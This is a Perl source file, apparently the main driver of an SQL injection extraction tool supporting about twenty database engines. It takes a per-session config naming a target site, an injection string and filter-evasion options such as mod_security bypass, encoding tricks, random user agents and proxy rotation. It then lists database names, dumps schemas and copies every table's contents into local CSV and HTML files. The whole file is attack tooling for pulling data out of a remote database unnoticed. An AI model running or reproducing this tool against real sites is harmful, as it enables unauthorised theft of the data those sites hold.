#!/usr/bin/perl

use strict;
use lib qw(./libs/);
use Data::Dump qw(dump);
use HTML::TreeBuilder;
use Getopt::Std;

#objects
use dbs::isr_oracle;
use dbs::isr_mssql;
use dbs::isr_mysql;
use dbs::isr_postgres;
use dbs::isr_db2;
use dbs::isr_interbase;
use dbs::isr_mimer;
use dbs::isr_virtuoso;
use dbs::isr_pervasive;
use dbs::isr_hsqldb;
use dbs::isr_sqlite;
use dbs::isr_informix;
use dbs::isr_sybase;
use dbs::isr_h2;
use dbs::isr_mckoi;
use dbs::isr_ingres;
use dbs::isr_monetdb;
use dbs::isr_maxdb;
use dbs::isr_thinksql;
use dbs::isr_sqlbase;
use connection;

&main();

##########################################################################
# FUNCTION   main
# RECEIVES
# RETURNS
# EXPECTS
# DOES       main function
sub main {

    my %args;
    my $m_sc=0;
    my $m_type=0;
    my $m_verb=0;
    my $m_session="conf";
    my $m_testpage="";
    
    # Get parameter
    &getopts("ctasdgvhn:p:", \%args);

    # Set/Check commands
    #actions
    if(defined $args{c}) { $m_sc++; $m_type=1;}
    if(defined $args{t}) { $m_sc++; $m_type=2;}
    if(defined $args{a}) { $m_sc++; $m_type=3;}    
    if(defined $args{s}) { $m_sc++; $m_type=4;}
    if(defined $args{d}) { $m_sc++; $m_type=5;}
    if(defined $args{g}) { $m_sc++; $m_type=6;}
    
    #options
    if(defined $args{n}) { $m_session=$args{n}; }
    if(defined $args{p}) { $m_testpage=$args{p}; }
    
    if(defined $args{v}) { $m_verb=1;}    
    if(defined $args{h}) { &usage; }

    if ($m_sc > 1 || $m_sc == 0) { print "Error: select one action\n"; &usage;}
    if ($m_session !~ /^[\w-_\.]+$/) { print "Error: specify valid session name (only word values)\n"; &usage;}

    eval("use $m_session;");
    
    if ($@) { die "Error: Load module, Details: ($@)"; } 

    #Create connection object
    my $conn = connection->new( session=>$conf::session,
				site=>$conf::site,
				script=>$conf::script,
				inj=>$conf::inj,
				where=>$conf::where,
				tail=>$conf::tail,				
				method=>$conf::method,
				param=>$conf::param,
				space=>$conf::space,
				proxy_host=>$conf::proxy_host,
				rproxy=>$conf::rproxy,
				rproxyfile=>$conf::rproxyfile,
				scape_plas=>$conf::scape_plas,
				scape_pipe=>$conf::scape_pipe,
				scape_output_less=>$conf::scape_output_less,
				convertall_str=>$conf::convertall_str,
				debug=>$m_verb,
				mod_security=>$conf::mod_security,
				full_width=>$conf::full_width,
				convertall_hex=>$conf::convertall_hex,
				rnd_uppercase=>$conf::rnd_uppercase,
				apache_espace=>$conf::apache_espace,
				apache_espace_rnd=>$conf::apache_espace_rnd,
				apache_espace_rmaxn=>$conf::apache_espace_rmaxn,
				ruseragent=>$conf::ruseragent,
				ruseragentfile=>$conf::ruseragentfile,
				uagent=>$conf::uagent,
				delay=>$conf::delay,
				rdelay=>$conf::rdelay,				
				magicquotes=>$conf::magicquotes,
				mysql_cvt=>$conf::mysql_cvt,
				mysql_cvt_type=>$conf::mysql_cvt_type,
                                cookie=>$conf::cookie,
				cookies=>\@conf::cookies
);
    my $db;
    #Get dbtype
    for ($m_type) {
	/1/    and do { &parsemodule($m_testpage); last; } ;	# check parser module    
	/2/    and do { $db = detectDb($conn); &testpage($db); last; } ;	# Test Page
	/3/    and do { $db = detectDb($conn); &getdbsnames($db); last; } ;	# Get database names	
	/4/    and do { $db = detectDb($conn); &getdbschema($db); last; } ;	# Get database structure
	/5/    and do { $db = detectDb($conn); &getdbdata($db); last; } ;	# Get Database information
	/6/    and do { $db = detectDb($conn); &getdbdata($db,1); last; } ;	# Get graphic structure
    }

}
##########################################################################
# FUNCTION   detectDb
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Detect type of database
sub detectDb {

    my ($conn) = @_;
    my $db;
    for ($conf::dbtype) {
	/^1$/    and do { $db = isr_oracle->new(conn=>$conn); last; } ;		# oracle
	/^2$/    and do { $db = isr_mssql->new(conn=>$conn); last; } ;		# mssql
	/^3$/    and do { $db = isr_mysql->new(conn=>$conn); last; } ;		# mysql	
	/^4$/    and do { $db = isr_postgres->new(conn=>$conn); last; } ;	# postgres
	/^5$/    and do { $db = isr_db2->new(conn=>$conn); last; } ;		# db2
	/^6$/    and do { $db = isr_interbase->new(conn=>$conn); last; } ;	# interbase
	/^7$/    and do { $db = isr_mimer->new(conn=>$conn); last; } ;		# mimer
	/^8$/    and do { $db = isr_virtuoso->new(conn=>$conn); last; } ;	# virtuoso
	/^9$/    and do { $db = isr_pervasive->new(conn=>$conn); last; } ;	# pervasive
	/^10$/    and do { $db = isr_hsqldb->new(conn=>$conn); last; } ;	# hsqldb	
	/^11$/    and do { $db = isr_sqlite->new(conn=>$conn); last; } ;	# sqlite
	/^12$/    and do { $db = isr_informix->new(conn=>$conn); last; } ;	# informix
	/^13$/    and do { $db = isr_sybase->new(conn=>$conn); last; } ;	# sybase	
	/^14$/    and do { $db = isr_h2->new(conn=>$conn); last; } ;		# h2
	/^15$/    and do { $db = isr_mckoi->new(conn=>$conn); last; } ;		# mckoi
	/^16$/    and do { $db = isr_ingres->new(conn=>$conn); last; } ;	# ingres	
	/^17$/    and do { $db = isr_monetdb->new(conn=>$conn); last; } ;	# monetdb		
	/^18$/    and do { $db = isr_maxdb->new(conn=>$conn); last; } ;		# maxdb
	/^19$/    and do { $db = isr_thinksql->new(conn=>$conn); last; } ;	# thinksql
	/^20$/    and do { $db = isr_sqlbase->new(conn=>$conn); last; } ;	# sqlbase
    }
    return $db;

}
##########################################################################
# FUNCTION   testpage
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Get a test page
sub testpage {

    my ($db) = @_;
    
    doprint("-"x50);
    doprint("\nAction: Get testpage, Session name: $conf::session\n");
    doprint("-"x50);
    doprint("\n");
    
    $db->do_testpage();    
    die "Error: " . $db->{error} if ($db->{error});
    
    open(FF, "> ./template/$conf::session.testpage");
    print FF $db->get_testpage;
    close(FF);

}

##########################################################################
# FUNCTION   getdbsnames
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Get the database structure
sub getdbsnames{

    my ($db) = @_;

    doprint("-"x50);
    doprint("\nAction: Get db names, Session name: $conf::session\n");
    doprint("-"x50);
    doprint("\n"); 

    $db->do_dbsnames();
    die "Error: " . $db->{error} if ($db->{error});
    
    open(FF, "> ./template/$conf::session.dbsnames");
    print FF $db->get_dbsnames;
    close(FF);
    
}


##########################################################################
# FUNCTION   getdbschema
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Get the database structure
sub getdbschema{

    my ($db) = @_;

    doprint("-"x50);
    doprint("\nAction: Get dbschema, Session name: $conf::session\n");
    doprint("-"x50);
    doprint("\n"); 

    if ($conf::dbtype == 2 ){ 
        my $dbsnames = &getdbsnameshash();
	die "\nError parsearing dbsnames " if (!$dbsnames);
	foreach my $item ( keys %$dbsnames){
	    if ($conf::deny_dbname->{$item}!=1){ #filter deny_dbname
		doprint("\nGet dbschema ($item)\n");
		$db->do_dbschema($item);
	    }
	}	
    }else{
	$db->do_dbschema();
    }
    
}

##########################################################################
# FUNCTION   getdbschemahash
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Get the database name in hash format
sub getdbsnameshash{

    my ($file) = @_;

    $file ||= "./template/$conf::session.dbsnames";

    open(FF, "$file") or die "Error open file: ($file) $@\n";
    my $data = join(/\n/,<FF>);
    close(FF);

    my (@values) = &get_values($data);
    my $dbnames;

    foreach my $item (@values){
	if (@{$item}[0] ne "") {
	    $dbnames->{@{$item}[0]}=1;
	}
    }
    return ($dbnames);
}

##########################################################################
# FUNCTION   getdbdata
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Get the database information
sub getdbdata{

    my ($db,$graph) = @_;

    my $msg ='DBDATA';
    $msg ='DBGRAPH' if ($graph);
    
    doprint("-"x50);
    doprint("\nAction: Get $msg, Session name: $conf::session\n");
    doprint("-"x50);
    doprint("\n"); 

    my $g;
    if ($graph) {
	require GraphViz;
	$g = GraphViz->new(layout=>$conf::glayout,rankdir=>1);
	$g->add_node('root', label => $conf::site."\n".$conf::script, style=>'filled', fillcolor =>$conf::grootcolor);
    }
    if ($conf::dbtype == 2 ){
        my $dbsnames = &getdbsnameshash();
	die "\nError parsearing dbsnames " if (!$dbsnames);
	foreach my $item ( keys %$dbsnames){
	    if ($conf::deny_dbname->{$item}!=1){ #filter deny_dbname
		doprint("\nGet dbschema ($item)\n");
		dodbdata($db,$item,$graph,$g);
	    }
	}
    
    }
    else{
	dodbdata($db,undef,$graph,$g);
    }
    
    if ($graph) {
	doprint("\nSaving graph....\n");
        $g->as_gif("$conf::graphdir/$conf::session.gif");
    }
}



##########################################################################
# FUNCTION   getdbdata
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Get the database information
sub dodbdata{

    my ($db,$dbname,$graph,$g) = @_;
    my $root;

    my $add;
    if ($dbname){
	$add="..";
	$root="$conf::session.$dbname.dbschema";
    }else {
	$add=".";
	$root="$conf::session.dbschema";
    }
    my $file = "./template/$root";

    doprint("-"x50);
    doprint("\nAction: Get DBDATA, Session name: $conf::session, DbSchema: $root\n");
    doprint("-"x50);
    doprint("\n");
    
    open(FF, "$file") or die "Error open file: ($file) $@\n";
    my $data = join(/\n/,<FF>);
    close(FF);
    
    
    my ($h_dbs)=&process_value($data,$dbname,$db);
#    print dump($h_dbs);
    
    foreach my $h_db (keys %$h_dbs) {    
	next if ($conf::deny_dbname->{$h_db}==1);
        if ($graph) { #Graph mode
	    $g->add_node($h_db, label => $h_db, style=>'filled', fillcolor =>$conf::gdbcolor);
	    $g->add_edge('root' => $h_db);
	}
	foreach my $table ( keys %{$h_dbs->{$h_db}}){
#    	    next if $table ne 'PAT_PERIODOS'; #del
	    my @cols;
            my $item =$h_dbs->{$h_db}->{$table};
	    
	    my $mtable = $table.rand();
	    if ($graph) {#Graph mode
		$g->add_node($mtable, label => $table, style=>'filled', fillcolor =>$conf::gtablecolor);
		$g->add_edge($h_db => $mtable);
	    }
	    
	    my $mcol;
            foreach my $k (keys %$item){
                push @cols,$k;
		$mcol.="'".$k."',";
		if ($graph && $conf::gcolumn == 1) {
		    my $mname= $k. rand();
		    $g->add_node($mname, label => $k, style=>'filled', fillcolor =>$conf::gcolumncolor);
		    $g->add_edge($mtable => $mname);
		}
            }
	    if ($graph){
		doprint("Graphing table : $h_db.$table\n");
		next; #goto next item if we are in graph mode
	    }
	    chop($mcol);
	    
	    my $response =$db->process_page($h_db.$add.$table,$item,undef,undef,@cols);
	    my $srcpage =$conf::outputdb.$conf::session.".$h_db.$table.sql.html";
	    my $csvpage =$conf::outputdb.$conf::session.".$h_db.$table.csv";
	    
	    $response ||=$db->{error};
	    
	    #TODO: check name scaped
	    doprint("Save source table: $srcpage\n");
            open(FZ,">$srcpage") or doprint("Warning: Can't open handler file src ($srcpage)\n");
            print FZ "="x25;
            print FZ "\n";
            print FZ $db->{lastinj}."\n";
            print FZ $response;
            close(FZ);
	    
	    doprint("Save csv table: $csvpage\n");
	    open(FZ,">$csvpage") or doprint("Warning: Can't open handler file csv ($csvpage)\n");	    
	    my @rows = get_values($response);
	    print FZ "$mcol\n";
	    print FZ get_rows(@rows);
	    close(FZ);
	}    
    }
    
}
##########################################################################
# FUNCTION   process_value
# RECEIVES
# RETURNS    array schema format
# EXPECTS
# DOES       Parse html data
sub process_value {
    my ($data,$dbname,$db) = @_;

    my @values;
    my (@defval) = &get_values($data);

    #TODO: delete this if, implement process_schema all dbs (return the same values that receive)
    if ($conf::dbtype == 11){ #sqlite
	@values = $db->process_schema(@defval);
    } else {
	@values = @defval;
    }
    
    my $htables;
    foreach my $item (@values){
	if (@{$item}[1] ne "" || @{$item}[2] ne "" ) {
	    $htables->{@{$item}[0]}->{@{$item}[1]}->{@{$item}[2]}=@{$item}[3];
	}
	
    }
    return ($htables);
}
##########################################################################
# FUNCTION   get_rows
# RECEIVES
# RETURNS    string csv values
# EXPECTS
# DOES       parse arrays values
sub get_rows {
    my (@rows) = @_;
    my $str;
    foreach my $item (@rows){
	foreach my $o (@{$item}){
	    $str .= dump($o) .",";
	}
	chop($str);
	$str.="\n";
    } 
    return $str;
}

##########################################################################
# FUNCTION   parsemodule
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Use a testpage save to verify the parsemodule.
sub parsemodule{

    my ($file) = @_;
    $file ||= "./template/$conf::session.testpage";

    doprint("-"x50);
    doprint("\nAction: ParseModule, Session name: $conf::session, TestPage: $conf::session.testpage\n");
    doprint("-"x50);
    doprint("\n");
    
    open(FF, "$file") or die "Error open file: ($file) $@\n";
    my $data = join(/\n/,<FF>);
    close(FF);
    
    my (@val) = &get_values($data);
    print dump(@val);

}

##########################################################################
# FUNCTION   usage
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Display help information.
sub usage{

    my $use="Usage: ./$0 [ACTION] [OPTIONS]\n
Action:
    -c:  Check parser module
    -t:  Get test page
    -a:  Get all database names (only mssql)
    -s:  Get database/s structure/s
    -d:  Get database/s information/s (csv format)
    -g:  Graphic structure of database (gif format)\n
    
Options:
    -n:  Session name
    -p: (Use with -c action, specify src page to check the module);
	Default ./template/\$SESSION.testpage
    -v:  Verbose
    -h:  Help\n
";
      print $use;
      exit;
    
}

##########################################################################
# FUNCTION   get_values
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Parse the html information
sub get_values {
    my($data) = @_;
    my $warn=0;
    $HTML::TreeBuilder::DEBUG = 0; # default debug level

    my $h = HTML::TreeBuilder->new;
    $h->ignore_unknown(0);
    $h->warn($warn);
    $h->parse($data);

    my ($auto_a,$auto_b,@auto_data);
    my $n=0;
    my @dst;
    @dst[$n]=$h;
    my @items;
    my @gitems;
    my @rows;

    foreach my $obj (@conf::path){
	my $name=$obj->{'name'}->{'VAL'};
	my $pos=$obj->{'pos'}->{'VAL'};
	my $last=$obj->{'last'}->{'VAL'};
	my $action=$obj->{'action'}->{'VAL'};	
	my $debug=$obj->{'debug'}->{'VAL'};

	
	if ($last eq ""){

	    if($pos) {
		$dst[$n+1] = ($dst[$n]->look_down('_tag',$name))[$pos];
		@gitems = ($dst[$n]->look_down('_tag',$name))[$pos]; 
	    }else {
		$dst[$n+1] = $dst[$n]->look_down('_tag',$name);
		@gitems = $dst[$n]->look_down('_tag',$name);
	    }
	    
	    print "-"x25;
	    print dump(@gitems) if ($debug eq '1');
	    print "-"x25;
	    
	    if (!$dst[$n+1]){
		doprint("Warning: Parser error don't find tagname ($name)\n");
		return undef;
	    }
	    $n++;
	    
	}elsif($last eq "1"){
	    print "-"x25;
	    print dump(@gitems) if ($debug eq '1');
	    print "-"x25;
	
	    foreach my $r (@gitems){
		@items = $r->look_down('_tag',$name);
		@auto_data=undef;
		eval($action);
	    }
	}
    }
    return (@rows);
}
##########################################################################
# FUNCTION   doprint
# RECEIVES
# RETURNS
# EXPECTS
# DOES       Print information
sub doprint {
    my ($value) = @_;
    print $value;
}
